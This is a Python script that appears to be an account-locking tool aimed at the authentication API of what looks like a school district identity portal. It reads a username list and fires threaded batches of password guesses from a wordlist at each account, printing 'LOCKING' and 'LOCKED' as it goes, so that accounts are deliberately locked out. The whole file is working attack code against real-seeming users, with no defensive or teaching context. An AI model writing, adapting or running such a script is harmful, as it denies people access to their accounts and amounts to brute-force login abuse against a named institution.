 #!/usr/bin/env python3

import requests
import rid_api
from threading import Thread
from itertools import islice
import time
import sys

print("LOCKING ACCOUNTS IN 5 SECONDS")
print("PRESS CTRL+C TO CANCEL\n")
time.sleep(5)

#Portal API URL
api_url = "https://portal.id.cps.edu/api/rest/authn"
#Username list file
name_file = open("/mnt/data/rid-locker/account_list")
name_list = name_file.read().splitlines()
name_list_parsed = [x for x in name_list if not x.startswith('#')]
#Thread settings
thread_count = 10
words_per_thread = 10
#Wordlist file
wordlist = '/mnt/data/rid-locker/all_in_one_w'
#TIme to wait between each account (IN seconds)
delay_time = 1

for username in name_list_parsed:
    log_username = username.ljust(20)
    sys.stdout.write("{} : WAITING\r".format(log_username))
    time.sleep(delay_time)
    sys.stdout.write("{} : LOCKING\r".format(log_username))
    with open(wordlist) as f:
        thread_list = []
        for i in range(0,thread_count):
            #Split list of words into slices for multi-threaded processing
            next_n_lines = list(islice(f, words_per_thread))
            #Stop if no more words to avoid exception
            if not next_n_lines:
                break
            temp_thread = Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines))
            temp_thread.start()
            thread_list.append(temp_thread)
        for thread in thread_list:
            thread.join()
        sys.stdout.write("{} : LOCKED \r\n".format(log_username))